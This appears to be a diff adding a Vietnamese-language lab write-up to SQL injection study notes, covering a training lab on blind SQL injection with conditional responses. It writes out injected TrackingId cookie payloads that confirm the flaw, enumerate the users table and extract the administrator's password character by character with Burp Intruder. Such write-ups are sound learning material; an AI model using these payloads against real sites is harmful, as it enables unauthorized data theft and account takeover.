@@ -105,6 +105,62 @@ Khi một ứng dụng bị lỗ hổng SQL injection và kết quả của truy
   + Nếu TrackingId không hợp lệ → không hiển thị thông báo đó.
 > Dựa vào sự khác biệt này, ta có thể khai thác SQLi mù bằng cách chèn điều kiện để kiểm tra từng thông tin.
 **Lab: Blind SQL injection with conditional responses**
+1) Xác nhận tham số dễ bị Blind SQLi
+   ```
+    TrackingId=Yf6Tdf7oLD3eWgG7' AND '1'='1
+    TrackingId=Yf6Tdf7oLD3eWgG7' AND '1'='2
+   ```
+   
+<img width="1496" height="650" alt="image" src="https://github.com/user-attachments/assets/b2e552db-87eb-4842-822c-1dfa37da3f5f" />
+> Điều kiện TRUE → xuất hiện "Welcome back"
+
+<img width="1496" height="721" alt="image" src="https://github.com/user-attachments/assets/1e7f95de-0aa0-445b-9d21-a67738ec66bc" />
+> Điều kiện FALSE  → không xuất hiện "Welcome back"
+
+2) Xác nhận tồn tại bảng users
+```
+TrackingId=Yf6Tdf7oLD3eWgG7' AND (SELECT 'a' FROM users LIMIT 1)='a
+```
+<img width="1492" height="713" alt="image" src="https://github.com/user-attachments/assets/fc95ad7b-b85f-4cdf-b526-c13275d8cdf8" />
+>  Bảng users tồn tại trong cơ sở dữ liệu.
+
+3) Xác nhận tồn tại user _administrator_ trong bảng users
+```
+TrackingId=Yf6Tdf7oLD3eWgG7' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+```
+<img width="1506" height="703" alt="image" src="https://github.com/user-attachments/assets/920704bf-ad8b-479e-99a1-1e4216edffe0" />
+> User _administrator_ có tồn tại 
+
+4) Liệt kê (enumerate) mật khẩu của user administrator
+```
+TrackingId=Yf6Tdf7oLD3eWgG7' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+```
+<img width="1493" height="565" alt="image" src="https://github.com/user-attachments/assets/d2b41d18-3ef9-4b8b-9f23-444973e7e2f8" />
+> Điều kiện này phải đúng, xác nhận rằng mật khẩu có chiều dài lớn hơn 1 ký tự.
+Lấn lượt tăng số sao cho đến khi không hiện Welcome back, sau khi thử nhieuf lần thì thấy tới 20 là không hiện Welcome back nữa => mật khẩu có 20 kí tự
+<img width="1482" height="763" alt="image" src="https://github.com/user-attachments/assets/c3e34073-d82f-41b5-a07b-39bdda227739" />
+
+5) Dò mật khẩu của administrator
+```
+TrackingId=Yf6Tdf7oLD3eWgG7' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+```
+Lấy mật khẩu của user 'administrator' trong bảng users, lấy từ ký tự thứ 1 của chuỗi password, số lượng ký tự = 1 và so sánh với kí tự 'a'
+- Nếu kí tự đầu tiên của pw là 'a' thì điều kiện đúng
+- Nếu khác 'a' thì điều kiện sai
+<img width="1487" height="651" alt="image" src="https://github.com/user-attachments/assets/da6978a3-002e-483e-8908-5b9d9f5efcad" />
+> Kí tự đầu tiên trong pw không phải là 'a'
+
+Thêm vào Intruder để dò mật khẩu
+<img width="1913" height="869" alt="image" src="https://github.com/user-attachments/assets/794c1884-a885-43f8-852e-2a1ebdd16541" />
+<img width="637" height="505" alt="image" src="https://github.com/user-attachments/assets/8301dfc4-4982-4a22-a0c2-f2721ee9dccc" />
+- Lọc để chọn ra những mật khẩu hiện "Welcome back"
+<img width="1569" height="514" alt="image" src="https://github.com/user-attachments/assets/ada2899e-8b39-452c-baa5-92b610c0833f" />
+- viết lại các kí tự lần lượt theo thứ tự từ 1 - 20 
+<img width="1530" height="713" alt="image" src="https://github.com/user-attachments/assets/1cde8257-350f-4d67-a177-853476e86b00" />
+>  Ta có mật khẩu là _oa7uk3lrbpf9xct78f9v_
+<img width="1836" height="830" alt="image" src="https://github.com/user-attachments/assets/db5a7fe7-57a3-452b-b5cb-12c2bbda3afd" />
+> Đăng nhập thành công
+**Lab: Blind SQL injection with conditional responses**
 
 - **SQL Injection dựa trên lỗi (Error-based SQL injection)**
 Là kỹ thuật lợi dụng thông báo lỗi từ cơ sở dữ liệu để trích xuất hoặc suy luận dữ liệu nhạy cảm, kể cả trong trường hợp mù.
